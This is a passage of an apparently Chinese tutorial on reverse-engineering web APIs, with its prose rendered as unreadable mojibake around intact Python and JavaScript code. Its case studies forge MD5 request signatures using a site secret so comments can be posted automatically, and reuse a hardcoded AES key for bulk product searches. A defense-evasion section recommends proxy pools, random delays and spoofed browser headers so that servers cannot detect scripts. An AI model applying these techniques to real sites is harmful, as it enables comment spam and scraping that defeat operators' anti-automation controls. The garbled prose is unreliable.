            <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">request</span><span class="p">))</span>
            <span class="n">response</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="p">)[</span><span class="s1">&#39;result&#39;</span><span class="p">]</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="n">client</span> <span class="o">=</span> <span class="n">RPCClient</span><span class="p">()</span>
    <span class="n">sign</span> <span class="o">=</span> <span class="k">await</span> <span class="n">client</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;getSign&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;videoId&#39;</span><span class="p">:</span> <span class="s1">&#39;BV1xv4y1X7Yp&#39;</span><span class="p">,</span> <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="mi">1638360000</span><span class="p">})</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ç­¾åç»“æœ: </span><span class="si">{</span><span class="n">sign</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
</code></pre>
      </div>

      <p><strong>ä¼˜ç‚¹</strong>ï¼š</p>

      <ul>
        <li>âœ… ä¸éœ€è¦å¤ç°å¤æ‚ç®—æ³•</li>
        <li>âœ… è‡ªåŠ¨è·Ÿéšç½‘ç«™æ›´æ–°</li>
        <li>âœ… å¯è°ƒç”¨ä»»ä½• JS å‡½æ•°ï¼ˆåŒ…æ‹¬ WebAssemblyï¼‰</li>
      </ul>

      <p><strong>ç¼ºç‚¹</strong>ï¼š</p>

      <ul>
        <li>âŒ éœ€è¦æµè§ˆå™¨ä¸€ç›´è¿è¡Œ</li>
        <li>âŒ æ€§èƒ½è¾ƒä½ï¼ˆç½‘ç»œé€šä¿¡å¼€é”€ï¼‰</li>
        <li>âŒ ä¸é€‚åˆé«˜å¹¶å‘åœºæ™¯</li>
      </ul>

      <hr />

      <h2 id="7-å¸¸è§é™·é˜±ä¸è°ƒè¯•æŠ€å·§">7. å¸¸è§é™·é˜±ä¸è°ƒè¯•æŠ€å·§</h2>

      <h3 id="71-å‚æ•°é¡ºåºé—®é¢˜">7.1 å‚æ•°é¡ºåºé—®é¢˜</h3>

      <p><strong>é”™è¯¯ç¤ºä¾‹</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Python çš„å­—å…¸æ˜¯æ— åºçš„ï¼ˆ3.7+ ä¿æŒæ’å…¥é¡ºåºï¼‰</span>
<span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;c&quot;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;b&quot;</span><span class="p">:</span> <span class="mi">2</span><span class="p">}</span>
<span class="n">sign</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="s2">&quot;&amp;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">params</span><span class="p">]))</span>  <span class="c1"># âŒ é”™è¯¯</span>
</code></pre>
      </div>

      <p><strong>æ­£ç¡®åšæ³•</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¿…é¡»æŒ‰å­—å…¸åºæˆ–æŒ‡å®šé¡ºåºæ’åº</span>
<span class="n">sign</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="s2">&quot;&amp;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="n">params</span><span class="p">[</span><span class="n">k</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">keys</span><span class="p">())]))</span>  <span class="c1"># âœ… æ­£ç¡®</span>
</code></pre>
      </div>

      <h3 id="72-å­—ç¬¦ç¼–ç é—®é¢˜">7.2 å­—ç¬¦ç¼–ç é—®é¢˜</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æµè§ˆå™¨ä¸­å¯èƒ½ä½¿ç”¨ UTF-8 ç¼–ç </span>
<span class="n">sign_js</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="s2">&quot;ä¸­æ–‡å‚æ•°&quot;</span><span class="p">)</span>  <span class="c1"># JavaScript é»˜è®¤ UTF-8</span>

<span class="c1"># Python å¿…é¡»æ˜¾å¼æŒ‡å®šç¼–ç </span>
<span class="n">sign_py</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="s2">&quot;ä¸­æ–‡å‚æ•°&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>  <span class="c1"># âœ…</span>
</code></pre>
      </div>

      <h3 id="73-æµ®ç‚¹æ•°ç²¾åº¦">7.3 æµ®ç‚¹æ•°ç²¾åº¦</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// JavaScript</span>
<span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span><span class="w">  </span><span class="c1">// 1638360000123ï¼ˆ13ä½æ¯«ç§’ï¼‰</span>

<span class="c1">// Python</span>
<span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">int</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">time</span><span class="p">())</span><span class="w">  </span><span class="c1">// 1638360000ï¼ˆ10ä½ç§’ï¼‰âŒ</span>
<span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">int</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">time</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1000</span><span class="p">)</span><span class="w">  </span><span class="c1">// 1638360000123 âœ…</span>
</code></pre>
      </div>

      <h3 id="74-è°ƒè¯•æŠ€å·§diff-å¯¹æ¯”">7.4 è°ƒè¯•æŠ€å·§ï¼šDiff å¯¹æ¯”</h3>

      <p>å½“ç­¾åå§‹ç»ˆä¸åŒ¹é…æ—¶ï¼Œå¯¹æ¯”æµè§ˆå™¨å’Œè„šæœ¬çš„ä¸­é—´ç»“æœï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åœ¨æµè§ˆå™¨ Console ä¸­æ‰“å°</span>
<span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="s2">&quot;å¾…ç­¾åå­—ç¬¦ä¸²:&quot;</span><span class="p">,</span> <span class="n">rawString</span><span class="p">);</span>
<span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="s2">&quot;ç­¾åç»“æœ:&quot;</span><span class="p">,</span> <span class="n">sign</span><span class="p">);</span>

<span class="c1"># åœ¨ Python ä¸­æ‰“å°</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;å¾…ç­¾åå­—ç¬¦ä¸²:&quot;</span><span class="p">,</span> <span class="n">raw_string</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ç­¾åç»“æœ:&quot;</span><span class="p">,</span> <span class="n">sign</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨åœ¨çº¿ Diff å·¥å…·å¯¹æ¯”</span>
<span class="c1"># https://www.diffchecker.com/</span>
</code></pre>
      </div>

      <hr />

      <h2 id="8-å®æˆ˜æ¡ˆä¾‹">8. å®æˆ˜æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹-1æŸæ–°é—»ç½‘ç«™è¯„è®ºæ¥å£">æ¡ˆä¾‹ 1ï¼šæŸæ–°é—»ç½‘ç«™è¯„è®ºæ¥å£</h3>

      <p><strong>ç›®æ ‡</strong>: è‡ªåŠ¨å‘è¡¨è¯„è®º</p>

      <p><strong>åˆ†æè¿‡ç¨‹</strong>:</p>

      <ol>
        <li>æŠ“åŒ…å‘ç° POST è¯·æ±‚å‚æ•°åŒ…å« <code>content</code>, <code>article_id</code>, <code>timestamp</code>, <code>sign</code>
        </li>
        <li>æœç´¢ <code>sign</code> å…³é”®å­—ï¼Œå®šä½åˆ° <code>utils.js:1234</code></li>
        <li>å‘ç°ç­¾åé€»è¾‘ï¼š<code>MD5(article_id + content + timestamp + "news_secret_2024")</code></li>
        <li>æµ‹è¯•å‘ç° <code>timestamp</code> æœ‰ Â± 5 åˆ†é’Ÿå®¹é”™</li>
      </ol>

      <p><strong>å®Œæ•´è„šæœ¬</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">def</span><span class="w"> </span><span class="nf">post_comment</span><span class="p">(</span><span class="n">article_id</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
    <span class="n">sign</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">article_id</span><span class="si">}{</span><span class="n">content</span><span class="si">}{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">news_secret_2024&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
    <span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;article_id&quot;</span><span class="p">:</span> <span class="n">article_id</span><span class="p">,</span>
        <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="n">content</span><span class="p">,</span>
        <span class="s2">&quot;timestamp&quot;</span><span class="p">:</span> <span class="n">timestamp</span><span class="p">,</span>
        <span class="s2">&quot;sign&quot;</span><span class="p">:</span> <span class="n">sign</span>
    <span class="p">}</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
        <span class="s2">&quot;https://news.example.com/api/comment/add&quot;</span><span class="p">,</span>
        <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
            <span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0&quot;</span><span class="p">,</span>
            <span class="s2">&quot;Cookie&quot;</span><span class="p">:</span> <span class="s2">&quot;session=YOUR_SESSION_COOKIE&quot;</span>
        <span class="p">}</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

<span class="c1"># æµ‹è¯•</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">post_comment</span><span class="p">(</span><span class="mi">12345</span><span class="p">,</span> <span class="s2">&quot;è¿™ç¯‡æ–‡ç« å†™å¾—çœŸå¥½ï¼&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="æ¡ˆä¾‹-2æŸç”µå•†æœç´¢æ¥å£aes-åŠ å¯†">æ¡ˆä¾‹ 2ï¼šæŸç”µå•†æœç´¢æ¥å£ï¼ˆAES åŠ å¯†ï¼‰</h3>

      <p><strong>ç›®æ ‡</strong>: æ‰¹é‡æœç´¢å•†å“ä»·æ ¼</p>

      <p><strong>åˆ†æè¿‡ç¨‹</strong>:</p>

      <ol>
        <li>å‘ç°è¯·æ±‚å‚æ•° <code>q</code> æ˜¯åŠ å¯†çš„ï¼š<code>q=U2FsdGVkX1+3g7h2k...</code>ï¼ˆBase64 æ ¼å¼ï¼‰</li>
        <li>æœç´¢ <code>encrypt</code> å…³é”®å­—ï¼Œæ‰¾åˆ° <code>CryptoJS.AES.encrypt</code></li>
        <li>æå– AES å¯†é’¥å’Œ IVï¼ˆç¡¬ç¼–ç åœ¨ JS ä¸­ï¼‰</li>
        <li>å‘ç°åŠ å¯†æ¨¡å¼ä¸º AES-128-CBC</li>
      </ol>

      <p><strong>å®Œæ•´è„šæœ¬</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.Padding</span><span class="w"> </span><span class="kn">import</span> <span class="n">pad</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="k">def</span><span class="w"> </span><span class="nf">encrypt_query</span><span class="p">(</span><span class="n">keyword</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;1234567890abcdef&#39;</span>
    <span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;abcdef1234567890&#39;</span>

    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">keyword</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">search_product</span><span class="p">(</span><span class="n">keyword</span><span class="p">):</span>
    <span class="n">encrypted_q</span> <span class="o">=</span> <span class="n">encrypt_query</span><span class="p">(</span><span class="n">keyword</span><span class="p">)</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
        <span class="s2">&quot;https://shop.example.com/api/search&quot;</span><span class="p">,</span>
        <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;q&quot;</span><span class="p">:</span> <span class="n">encrypted_q</span><span class="p">}</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

<span class="c1"># æ‰¹é‡æœç´¢</span>
<span class="n">keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;iPhone 15&quot;</span><span class="p">,</span> <span class="s2">&quot;MacBook Pro&quot;</span><span class="p">,</span> <span class="s2">&quot;AirPods&quot;</span><span class="p">]</span>
<span class="k">for</span> <span class="n">keyword</span> <span class="ow">in</span> <span class="n">keywords</span><span class="p">:</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">search_product</span><span class="p">(</span><span class="n">keyword</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">keyword</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">results</span><span class="p">[</span><span class="s1">&#39;total&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> ä¸ªç»“æœ&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="9-é˜²å¾¡ä¸å¯¹æŠ—">9. é˜²å¾¡ä¸å¯¹æŠ—</h2>

      <h3 id="91-æœåŠ¡ç«¯é˜²æŠ¤æ‰‹æ®µ">9.1 æœåŠ¡ç«¯é˜²æŠ¤æ‰‹æ®µ</h3>

      <table>
        <thead>
          <tr>
            <th>é˜²æŠ¤æ–¹æ³•</th>
            <th>åŸç†</th>
            <th>ç»•è¿‡éš¾åº¦</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>æ—¶é—´æˆ³æ ¡éªŒ</strong></td>
            <td>æ‹’ç»è¿‡æœŸè¯·æ±‚ï¼ˆÂ± 60sï¼‰</td>
            <td>â­ ç®€å•ï¼ˆåŒæ­¥æ—¶é’Ÿï¼‰</td>
          </tr>
          <tr>
            <td><strong>Nonce å»é‡</strong></td>
            <td>ç¼“å­˜æœ€è¿‘çš„éšæœºæ•°</td>
            <td>â­â­ ä¸­ç­‰ï¼ˆç”Ÿæˆå”¯ä¸€å€¼ï¼‰</td>
          </tr>
          <tr>
            <td><strong>è¯·æ±‚é¢‘ç‡é™åˆ¶</strong></td>
            <td>å• IP/ç”¨æˆ·é™åˆ¶ QPS</td>
            <td>â­â­â­ è¾ƒéš¾ï¼ˆIP æ±  + è´¦å·æ± ï¼‰</td>
          </tr>
          <tr>
            <td><strong>è¡Œä¸ºåˆ†æ</strong></td>
            <td>æ£€æµ‹è‡ªåŠ¨åŒ–ç‰¹å¾ï¼ˆé€Ÿåº¦ã€é¡ºåºï¼‰</td>
            <td>â­â­â­â­ å›°éš¾ï¼ˆæ¨¡æ‹Ÿäººç±»è¡Œä¸ºï¼‰</td>
          </tr>
          <tr>
            <td><strong>è®¾å¤‡æŒ‡çº¹</strong></td>
            <td>ç»‘å®šè®¾å¤‡ï¼ˆCanvasã€WebGLï¼‰</td>
            <td>â­â­â­â­ å›°éš¾ï¼ˆä¼ªé€ æŒ‡çº¹ï¼‰</td>
          </tr>
          <tr>
            <td><strong>éªŒè¯ç </strong></td>
            <td>äººæœºè¯†åˆ«ï¼ˆæ»‘å—ã€ç‚¹é€‰ï¼‰</td>
            <td>â­â­â­â­â­ æéš¾ï¼ˆOCR + æ‰“ç å¹³å°ï¼‰</td>
          </tr>
        </tbody>
      </table>

      <h3 id="92-é€†å‘å·¥ç¨‹å¸ˆå¯¹ç­–">9.2 é€†å‘å·¥ç¨‹å¸ˆå¯¹ç­–</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. ä½¿ç”¨ IP ä»£ç†æ± </span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;http://proxy1.com:8080&#39;</span><span class="p">,</span>
    <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="s1">&#39;http://proxy1.com:8080&#39;</span>
<span class="p">}</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>

<span class="c1"># 2. éšæœºåŒ–è¯·æ±‚é—´éš”</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">api_request</span><span class="p">()</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>  <span class="c1"># 2-5ç§’éšæœºå»¶è¿Ÿ</span>

<span class="c1"># 3. æ¨¡æ‹ŸçœŸå®æµè§ˆå™¨è¡Œä¸º</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.9,en;q=0.8&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate, br&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;https://www.example.com/&#39;</span><span class="p">,</span>
    <span class="s1">&#39;DNT&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Upgrade-Insecure-Requests&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="10-å·¥å…·æ¨è">10. å·¥å…·æ¨è</h2>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>ç”¨é€”</th>
            <th>å¹³å°</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Postman</strong></td>
            <td>API è°ƒè¯•ã€è¯·æ±‚é‡æ”¾</td>
            <td>å…¨å¹³å°</td>
          </tr>
          <tr>
            <td><strong>mitmproxy</strong></td>
            <td>æŠ“åŒ…ã€è¯·æ±‚ä¿®æ”¹ã€Python è„šæœ¬</td>
            <td>å…¨å¹³å°</td>
          </tr>
          <tr>
            <td><strong>Burp Suite</strong></td>
            <td>é«˜çº§æŠ“åŒ…ã€å‚æ•° Fuzzã€é‡æ”¾æ”»å‡»</td>
            <td>å…¨å¹³å°</td>
          </tr>
          <tr>
            <td><strong>Fiddler</strong></td>
            <td>Windows æŠ“åŒ…ç¥å™¨</td>
            <td>Windows</td>
          </tr>
          <tr>
            <td><strong>Charles</strong></td>
            <td>macOS æŠ“åŒ…å·¥å…·</td>
            <td>macOS</td>
          </tr>
          <tr>
            <td><strong>Insomnia</strong></td>
            <td>API è°ƒè¯•ï¼ˆPostman æ›¿ä»£å“ï¼‰</td>
            <td>å…¨å¹³å°</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>API é€†å‘çš„æœ¬è´¨æ˜¯<strong>ç†è§£é€šä¿¡åè®®</strong>ã€‚æŒæ¡ä»¥ä¸‹æŠ€èƒ½ä½ å°†æ— å¾€ä¸åˆ©ï¼š</p>

      <ol>
        <li>âœ… <strong>ç­¾åç®—æ³•è¯†åˆ«</strong>ï¼šMD5/SHA/HMAC/è‡ªå®šä¹‰ç®—æ³•</li>
        <li>âœ… <strong>åŠ å¯†å‚æ•°åˆ†æ</strong>ï¼šAES/RSA/è‡ªå®šä¹‰åŠ å¯†</li>
        <li>âœ… <strong>é˜²é‡æ”¾æœºåˆ¶ç»•è¿‡</strong>ï¼šæ—¶é—´æˆ³/Nonce/åºåˆ—å·</li>
        <li>âœ… <strong>è®¤è¯ç³»ç»Ÿ</strong>ï¼šJWT/Session/è‡ªå®šä¹‰ Token</li>
        <li>âœ… <strong>RPC è°ƒç”¨</strong>ï¼šå¤„ç†å¤æ‚ JS/WASM é€»è¾‘</li>
        <li>âœ… <strong>å¯¹æŠ—æ£€æµ‹</strong>ï¼šIP æ± ã€è¡Œä¸ºæ¨¡æ‹Ÿã€éªŒè¯ç å¤„ç†</li>
      </ol>

      <p><strong>è®°ä½</strong>: æœåŠ¡å™¨çœ‹ä¸å‡ºè¯·æ±‚æ¥è‡ªè„šæœ¬è¿˜æ˜¯æµè§ˆå™¨ï¼Œä½ å°±æˆåŠŸäº†ã€‚</p>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="#03-Basic-Recipes-crypto-identification">åŠ å¯†ç®—æ³•è¯†åˆ«</a></li>
        <li><a href="#03-Basic-Recipes-dynamic-parameter-analysis">åŠ¨æ€å‚æ•°åˆ†æ</a></li>
        <li><a href="#02-Tooling-puppeteer-playwright">Puppeteer ä¸ Playwright</a></li>
        <li><a href="#04-Advanced-Recipes-captcha-bypass">éªŒè¯ç ç»•è¿‡</a></li>
      </ul>

    </div>

    <div class="section" id="03-Basic-Recipes-crypto-identification">
      <h2>29. Crypto Identification</h2>
      <h1 id="åŠ å¯†ç®—æ³•è¯†åˆ«ä¸åˆ†æ">åŠ å¯†ç®—æ³•è¯†åˆ«ä¸åˆ†æ</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>Web åº”ç”¨ä¸­å¸¸ç”¨å„ç§åŠ å¯†ç®—æ³•æ¥ä¿æŠ¤æ•°æ®ä¼ è¾“å’Œå­˜å‚¨ã€‚è¯†åˆ«ä½¿ç”¨äº†å“ªç§ç®—æ³•æ˜¯é€†å‘çš„ç¬¬ä¸€æ­¥ã€‚æœ¬æ–‡ä»‹ç»å¸¸è§åŠ å¯†ç®—æ³•çš„ç‰¹å¾åŠè¯†åˆ«æ–¹æ³•ã€‚</p>

      <hr />

      <h2 id="å“ˆå¸Œç®—æ³•-hash-functions">å“ˆå¸Œç®—æ³• (Hash Functions)</h2>

      <h3 id="md5">MD5</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>è¾“å‡ºé•¿åº¦: 128 bit (16 bytes) = 32 ä½åå…­è¿›åˆ¶å­—ç¬¦</li>
        <li>ä¸å¯é€†ï¼ˆå•å‘ï¼‰</li>
        <li>å·²ä¸å®‰å…¨ï¼Œä½†ä»å¹¿æ³›ä½¿ç”¨</li>
      </ul>

      <p><strong>è¯†åˆ«æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å…¸å‹è¾“å‡º</span>
<span class="s2">&quot;5d41402abc4b2a76b9719d911017c592&quot;</span><span class="w"> </span><span class="c1">// MD5(&quot;hello&quot;)</span>

<span class="c1">// åº“ç‰¹å¾</span>
<span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>
<span class="nx">md5</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>Python å®ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;hello&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
<span class="c1"># &#39;5d41402abc4b2a76b9719d911017c592&#39;</span>
</code></pre>
      </div>

      <h3 id="shaå®¶æ—">SHAå®¶æ—</h3>

      <table>
        <thead>
          <tr>
            <th>ç®—æ³•</th>
            <th>è¾“å‡ºé•¿åº¦</th>
            <th>åå…­è¿›åˆ¶é•¿åº¦</th>
            <th>ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>SHA-1</td>
            <td>160 bit</td>
            <td>40 å­—ç¬¦</td>
            <td><code>aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d</code></td>
          </tr>
          <tr>
            <td>SHA-256</td>
            <td>256 bit</td>
            <td>64 å­—ç¬¦</td>
            <td><code>2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824</code></td>
          </tr>
          <tr>
            <td>SHA-512</td>
            <td>512 bit</td>
            <td>128 å­—ç¬¦</td>
            <td>(å¤ªé•¿çœç•¥)</td>
          </tr>
        </tbody>
      </table>

      <p><strong>è¯†åˆ«æ–¹æ³•</strong>:</p>

      <ul>
        <li>çœ‹è¾“å‡ºé•¿åº¦</li>
        <li>æœç´¢å…³é”®è¯: <code>SHA</code>, <code>sha256</code>, <code>createHash</code></li>
      </ul>

      <p><strong>Node.js å®ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">crypto</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
